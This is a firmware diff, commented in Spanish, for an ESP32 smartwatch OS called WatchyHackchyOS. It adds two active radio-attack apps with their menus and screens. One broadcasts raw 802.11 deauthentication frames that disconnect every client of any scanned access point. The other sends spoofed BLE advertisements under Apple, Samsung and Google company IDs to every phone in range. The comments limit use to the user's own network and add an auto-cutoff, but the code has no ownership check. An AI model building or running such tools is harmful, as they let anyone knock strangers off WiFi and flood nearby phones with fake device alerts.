@@ -8,6 +8,7 @@
 #include <esp_arduino_version.h>  // ESP_ARDUINO_VERSION_MAJOR: firma de BLEScan::start() cambia entre cores
 #include <BLEDevice.h>      // BLE "Bluedroid" del core ESP32 (el mismo que ya usa Watchy)
 #include <BLEScan.h>        // -> no uses NimBLE: choca con el BLE que incluye Watchy
+#include <BLEAdvertising.h> // para la app de spam BLE (BLEDevice::getAdvertising())
 #endif
 
 
@@ -76,6 +77,19 @@ RTC_DATA_ATTR uint8_t  monChan    = 1;
 RTC_DATA_ATTR bool     monHop     = true;
 RTC_DATA_ATTR bool     monAlert   = false;
 
+// Deauth (test de red propia): reutiliza los resultados del último escaneo
+// WiFi (wifiSSID/wifiBSSID/wifiChan) como lista de objetivos, no escanea aparte.
+RTC_DATA_ATTR int      deauthSel     = 0;      // índice en el array de wifi
+RTC_DATA_ATTR bool     deauthRunning = false;
+RTC_DATA_ATTR uint32_t deauthSent    = 0;      // tramas enviadas en esta sesión
+RTC_DATA_ATTR int32_t  deauthLeft    = 0;      // segundos hasta el autocorte
+
+// Spam BLE: anuncios falsos (sin objetivo, afecta a cualquiera que esté cerca)
+RTC_DATA_ATTR int      bleSpamMode    = 0;      // plantilla elegida (ver BLESPAM_NAMES)
+RTC_DATA_ATTR bool     bleSpamRunning = false;
+RTC_DATA_ATTR uint32_t bleSpamSent    = 0;      // anuncios emitidos en esta sesión
+RTC_DATA_ATTR int32_t  bleSpamLeft    = 0;      // segundos hasta el autocorte
+
 // Pomodoro
 RTC_DATA_ATTR bool     pomoRun    = false;
 RTC_DATA_ATTR bool     pomoBreak  = false;
@@ -89,7 +103,7 @@ RTC_DATA_ATTR uint8_t  almM       = 30;
 RTC_DATA_ATTR int      almLastMin = -1;     // evita repetir dentro del mismo minuto
 
 static const char *APP_NAMES[] = {"2fa / totp", "escaner wifi", "monitor 802.11",
-                                  "bluetooth", "pomodoro"};
+                                  "deauth test", "ble spam", "bluetooth", "pomodoro"};
 
 // ===========================================================================
 //  Bluetooth LE: estado del escáner + detector de trackers
@@ -160,6 +174,102 @@ void WatchyHackchyOS::monitorSample() {
 void WatchyHackchyOS::stopMonitorRadio() {
   esp_wifi_set_promiscuous(false);
   WiFi.mode(WIFI_OFF);
+}
+
+// ===========================================================================
+//  App: test de deauth — SOLO para probar tus propias redes/dispositivos.
+//  Reutiliza el objetivo elegido entre los resultados de la app wifi; nunca
+//  arranca sola (hay que pulsar MENU) y se corta a los DEAUTH_MAX_SECONDS
+//  segundos aunque no la detengas tú, para que nunca quede "olvidada" emitiendo.
+// ===========================================================================
+
+// Plantilla de trama de deauth 802.11 (cabecera MAC de 24 bytes + motivo de
+// 2 bytes). Destino broadcast: desconecta a todos los clientes asociados al
+// BSSID de origen, no a uno concreto (no tenemos escaneo de estaciones).
+static uint8_t deauthFrame[26] = {
+  0xC0, 0x00,                          // Frame Control: tipo gestión, subtipo deauth
+  0x00, 0x00,                          // Duration
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destino: broadcast (todos los clientes)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Origen: BSSID del objetivo (se rellena abajo)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID del objetivo (idem)
+  0x00, 0x00,                          // Secuencia/fragmento
+  0x01, 0x00,                          // Motivo: 1 = "unspecified reason"
+};
+
+// Una ráfaga corta por tick (se llama ~1 vez/segundo desde runApps). El
+// número de tramas y la pausa entre ellas limitan a propósito la potencia
+// del "ataque": esto es una demo de aula, no una herramienta de DoS seria.
+void WatchyHackchyOS::deauthBurst() {
+  if (deauthSel < 0 || deauthSel >= wifiCount) { deauthRunning = false; return; }
+  const uint8_t *bssid = wifiBSSID[deauthSel];
+  memcpy(deauthFrame + 10, bssid, 6);
+  memcpy(deauthFrame + 16, bssid, 6);
+  esp_wifi_set_channel(wifiChan[deauthSel], WIFI_SECOND_CHAN_NONE);
+  for (int i = 0; i < 10; i++) {
+    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
+    deauthSent++;
+    delay(5);
+  }
+}
+
+void WatchyHackchyOS::stopDeauth() {
+  deauthRunning = false;
+  WiFi.mode(WIFI_OFF);
+}
+
+// ===========================================================================
+//  App: spam BLE — emite anuncios falsos (imitan un company ID/UUID conocido)
+//  para mostrar que cualquiera puede anunciarse como un dispositivo BLE sin
+//  autenticación. A diferencia del deauth, NO tiene objetivo: lo recibe
+//  cualquier móvil BLE cercano, no uno elegido. Mismas barreras: nunca
+//  arranca sola, autocorte a BLESPAM_MAX_SECONDS, ráfaga limitada.
+//
+//  Los bytes del "payload" son genéricos (compañía real + relleno simple),
+//  no una réplica exacta del protocolo propietario de cada fabricante: basta
+//  para demostrar el problema de fondo, no para garantizar un popup idéntico
+//  al de un dispositivo real en cada versión de iOS/Android.
+// ===========================================================================
+struct BleSpamTemplate { const char *name; uint16_t companyId; };
+static const BleSpamTemplate BLESPAM_TEMPLATES[] = {
+  {"apple",   0x004C},   // Apple
+  {"samsung", 0x0075},   // Samsung
+  {"google",  0x00E0},   // Google
+};
+static const int BLESPAM_COUNT = sizeof(BLESPAM_TEMPLATES) / sizeof(BLESPAM_TEMPLATES[0]);
+// nombres para la UI: las plantillas + "mix" (ronda las tres cada ráfaga)
+static const char *BLESPAM_NAMES[] = {"apple", "samsung", "google", "mix"};
+
+static void bleSpamOne(const BleSpamTemplate &tpl) {
+  uint8_t md[2 + 5] = {
+    (uint8_t)(tpl.companyId & 0xFF), (uint8_t)(tpl.companyId >> 8),
+    0x0F, 0x05, 0xC1, 0x00, 0x00,            // relleno genérico, no un protocolo exacto
+  };
+  BLEAdvertisementData advData;
+  advData.setFlags(0x06);                     // LE General Discoverable, sin BR/EDR
+  advData.setManufacturerData(std::string((char *)md, sizeof(md)));
+  BLEAdvertising *adv = BLEDevice::getAdvertising();
+  adv->setAdvertisementData(advData);
+  adv->start();
+  delay(20);
+  adv->stop();
+}
+
+// Una ráfaga corta por tick: la plantilla elegida, o las tres si el modo es
+// "mix" (índice == BLESPAM_COUNT).
+void WatchyHackchyOS::bleSpamBurst() {
+  bool mix = bleSpamMode >= BLESPAM_COUNT;
+  int first = mix ? 0 : bleSpamMode;
+  int last  = mix ? BLESPAM_COUNT - 1 : bleSpamMode;
+  for (int t = first; t <= last; t++) {
+    bleSpamOne(BLESPAM_TEMPLATES[t]);
+    bleSpamSent++;
+  }
+}
+
+void WatchyHackchyOS::stopBleSpam() {
+  bleSpamRunning = false;
+  BLEDevice::getAdvertising()->stop();
+  BLEDevice::deinit(false);
 }
 #endif
 
@@ -305,6 +415,32 @@ void WatchyHackchyOS::runApps() {
             hackState = HS_LAUNCHER;
           }
           break;
+        case HS_DEAUTH:
+          if (wifiCount > 0) {
+            if (up   && deauthSel > 0)              deauthSel--;
+            if (down && deauthSel < wifiCount - 1)  deauthSel++;
+            if (menu) {                              // arma / corta la transmisión
+              deauthRunning = !deauthRunning;
+              if (deauthRunning) { deauthSent = 0; deauthLeft = DEAUTH_MAX_SECONDS; }
+            }
+          }
+          if (back) {
+            stopDeauth();
+            hackState = HS_LAUNCHER;
+          }
+          break;
+        case HS_BLESPAM:
+          if (up)   bleSpamMode = (bleSpamMode + BLESPAM_COUNT) % (BLESPAM_COUNT + 1);
+          if (down) bleSpamMode = (bleSpamMode + 1) % (BLESPAM_COUNT + 1);
+          if (menu) {                              // arma / corta la transmisión
+            bleSpamRunning = !bleSpamRunning;
+            if (bleSpamRunning) { bleSpamSent = 0; bleSpamLeft = BLESPAM_MAX_SECONDS; }
+          }
+          if (back) {
+            stopBleSpam();
+            hackState = HS_LAUNCHER;
+          }
+          break;
         case HS_BLE:
           if (menu) bleView = (bleView + 1) % 3;      // lista -> trackers -> densidad
           if (bleView == 0) {                          // navegación solo en la lista
@@ -341,7 +477,9 @@ void WatchyHackchyOS::runApps() {
       RTC.read(currentTime);             // hora fresca: el TOTP cuenta atrás de verdad
       checkAlarm();
       bool live = (hackState == HS_TOTP) || (hackState == HS_MON) ||
-                  (hackState == HS_POMO && pomoRun);
+                  (hackState == HS_POMO && pomoRun) ||
+                  (hackState == HS_DEAUTH && deauthRunning) ||
+                  (hackState == HS_BLESPAM && bleSpamRunning);
       if (live) {
         if (hackState == HS_POMO && pomoRun && --pomoLeft <= 0) {
           vibMotor(100, 6);
@@ -350,15 +488,25 @@ void WatchyHackchyOS::runApps() {
           pomoLeft = (pomoBreak ? POMO_BREAK_MIN : POMO_WORK_MIN) * 60;
         }
         if (hackState == HS_MON) monitorSample();
+        if (hackState == HS_DEAUTH && deauthRunning) {
+          deauthBurst();
+          if (--deauthLeft <= 0) deauthRunning = false;   // autocorte de seguridad
+        }
+        if (hackState == HS_BLESPAM && bleSpamRunning) {
+          bleSpamBurst();
+          if (--bleSpamLeft <= 0) bleSpamRunning = false;  // autocorte de seguridad
+        }
         renderCurrent();
         display.display(true);
       }
     }
     delay(40);
   }
-  // si el timeout nos saca estando en el monitor, apaga el modo promiscuo
-  // igual que hace la salida por BACK (si no, la radio se queda escuchando)
-  if (hackState == HS_MON) stopMonitorRadio();
+  // si el timeout nos saca de una app que transmite, apaga la radio igual que
+  // hace la salida por BACK (si no, se queda escuchando/transmitiendo)
+  if (hackState == HS_MON)     stopMonitorRadio();
+  if (hackState == HS_DEAUTH)  stopDeauth();
+  if (hackState == HS_BLESPAM) stopBleSpam();
   hackState = HS_WATCHFACE;
   showWatchFace(true);
 #endif
@@ -399,6 +547,24 @@ void WatchyHackchyOS::openApp(AppId id) {
       esp_wifi_set_promiscuous(true);
       esp_wifi_set_promiscuous_rx_cb(&sniffCB);
       break;
+    case APP_DEAUTH:
+      // reutiliza el último escaneo de la app wifi como lista de objetivos;
+      // nunca empieza a transmitir sola, hay que armarla con MENU
+      hackState = HS_DEAUTH;
+      deauthRunning = false;
+      deauthSent = 0;
+      if (deauthSel >= wifiCount) deauthSel = 0;
+      WiFi.mode(WIFI_STA);
+      WiFi.disconnect();
+      break;
+    case APP_BLESPAM:
+      // nunca empieza a transmitir sola, hay que armarla con MENU
+      hackState = HS_BLESPAM;
+      bleSpamRunning = false;
+      bleSpamSent = 0;
+      WiFi.mode(WIFI_OFF);              // coexistencia: libera la radio para BLE
+      BLEDevice::init("");
+      break;
     case APP_BLE:
       hackState = HS_BLE;
       display.fillScreen(bg());                 // splash mientras dura el escaneo
@@ -426,6 +592,8 @@ void WatchyHackchyOS::renderCurrent() {
     case HS_TOTP:     drawTOTP();     break;
     case HS_WIFI:     drawWiFi();     break;
     case HS_MON:      drawMonitor();  break;
+    case HS_DEAUTH:   drawDeauth();   break;
+    case HS_BLESPAM:  drawBleSpam();  break;
     case HS_BLE:      drawBluetooth();break;
     case HS_POMO:     drawPomodoro(); break;
     default:          drawWatchFace();break;
@@ -466,7 +634,8 @@ void WatchyHackchyOS::drawLauncher() {
   if (appSel < launcherTop)                launcherTop = appSel;
   if (appSel > launcherTop + visible - 1)  launcherTop = appSel - visible + 1;
   const char *desc[] = {"codigos de un solo uso", "redes al alcance",
-                        "escucha de tramas", "trackers y dispositivos",
+                        "escucha de tramas", "ataque deauth (tu red)",
+                        "anuncios BLE falsos", "trackers y dispositivos",
                         "foco + despertador"};
   for (int r = 0; r < visible && launcherTop + r < APP_COUNT; r++) {
     int i = launcherTop + r;
@@ -691,6 +860,115 @@ void WatchyHackchyOS::drawMonitor() {
     char n[12]; snprintf(n, sizeof(n), "%lu", (unsigned long)rows[i].v);
     textRight(R - 8, y + 4, n);
   }
+}
+
+// ===========================================================================
+//  App: test de deauth (activo — SOLO tus propias redes/dispositivos)
+// ===========================================================================
+void WatchyHackchyOS::drawDeauth() {
+  panel(L, 5, R, 32);
+  title(L + 6, 5, "deauth");
+  title(R - 6, 5, deauthRunning ? "TX" : "test", true, deauthRunning);
+  display.setFont(&Spleen5x8);
+  centerText(100, 26, "solo tu propia red");
+
+  if (wifiCount == 0) {
+    display.setFont(&Spleen6x12);
+    centerText(100, 100, "primero escanea redes");
+    centerText(100, 116, "(abre la app wifi)");
+    display.setFont(&Spleen5x8);
+    centerText(100, 194, "BACK salir");
+    return;
+  }
+
+  // objetivo elegido (de la lista de la app wifi)
+  panel(L, 38, R, 96);
+  title(L + 6, 38, "objetivo");
+  char hdr[8]; snprintf(hdr, sizeof(hdr), "%d/%d", deauthSel + 1, wifiCount);
+  title(R - 6, 38, hdr, true);
+  display.setFont(&Spleen6x12);
+  char ssid[16]; strncpy(ssid, wifiSSID[deauthSel], 15); ssid[15] = 0;
+  centerText(100, 60, ssid);
+  display.setFont(&Spleen5x8);
+  const uint8_t *m = wifiBSSID[deauthSel];
+  char meta[32];
+  snprintf(meta, sizeof(meta), "%02X:%02X:%02X:%02X:%02X:%02X  ch%02d",
+           m[0], m[1], m[2], m[3], m[4], m[5], wifiChan[deauthSel]);
+  centerText(100, 80, meta);
+
+  // estado: armado/transmitiendo o en reposo
+  panel(L, 102, R, 170);
+  if (deauthRunning) {
+    display.fillRect(L + 2, 104, R - L - 4, 23, fg());
+    display.setTextColor(bg());
+    display.setFont(&Spleen6x12);
+    centerText(100, 119, "!! TRANSMITIENDO !!");
+    display.setTextColor(fg());
+    display.setFont(&Spleen5x8);
+    char st[28];
+    snprintf(st, sizeof(st), "%lu tramas  corte en %lds",
+             (unsigned long)deauthSent, (long)deauthLeft);
+    centerText(100, 140, st);
+  } else {
+    title(L + 6, 102, "estado");
+    display.setFont(&Spleen6x12);
+    textRight(R - 8, 120, "listo");
+    display.setFont(&Spleen5x8);
+    char st[24]; snprintf(st, sizeof(st), "autocorte: %ds", DEAUTH_MAX_SECONDS);
+    centerText(100, 140, st);
+  }
+
+  display.setFont(&Spleen5x8);
+  centerText(100, 184, "UP/DOWN red   MENU on/off");
+  centerText(100, 194, "BACK sale (corta ya)");
+}
+
+// ===========================================================================
+//  App: spam BLE (activo — sin objetivo, afecta a cualquiera que esté cerca)
+// ===========================================================================
+void WatchyHackchyOS::drawBleSpam() {
+  panel(L, 5, R, 32);
+  title(L + 6, 5, "ble spam");
+  title(R - 6, 5, bleSpamRunning ? "TX" : "test", true, bleSpamRunning);
+  display.setFont(&Spleen5x8);
+  centerText(100, 26, "sin objetivo: afecta a cualquiera");
+
+  // plantilla elegida
+  panel(L, 38, R, 96);
+  title(L + 6, 38, "plantilla");
+  char hdr[8]; snprintf(hdr, sizeof(hdr), "%d/%d", bleSpamMode + 1, BLESPAM_COUNT + 1);
+  title(R - 6, 38, hdr, true);
+  display.setFont(&Spleen6x12);
+  centerText(100, 70, BLESPAM_NAMES[bleSpamMode]);
+  display.setFont(&Spleen5x8);
+  centerText(100, 88, bleSpamMode >= BLESPAM_COUNT
+                       ? "ronda las tres cada rafaga" : "anuncio BLE falso");
+
+  // estado: armado/transmitiendo o en reposo
+  panel(L, 102, R, 170);
+  if (bleSpamRunning) {
+    display.fillRect(L + 2, 104, R - L - 4, 23, fg());
+    display.setTextColor(bg());
+    display.setFont(&Spleen6x12);
+    centerText(100, 119, "!! TRANSMITIENDO !!");
+    display.setTextColor(fg());
+    display.setFont(&Spleen5x8);
+    char st[28];
+    snprintf(st, sizeof(st), "%lu anuncios  corte en %lds",
+             (unsigned long)bleSpamSent, (long)bleSpamLeft);
+    centerText(100, 140, st);
+  } else {
+    title(L + 6, 102, "estado");
+    display.setFont(&Spleen6x12);
+    textRight(R - 8, 120, "listo");
+    display.setFont(&Spleen5x8);
+    char st[24]; snprintf(st, sizeof(st), "autocorte: %ds", BLESPAM_MAX_SECONDS);
+    centerText(100, 140, st);
+  }
+
+  display.setFont(&Spleen5x8);
+  centerText(100, 184, "UP/DOWN plantilla  MENU on/off");
+  centerText(100, 194, "BACK sale (corta ya)");
 }
 
 void WatchyHackchyOS::drawPomodoro() {
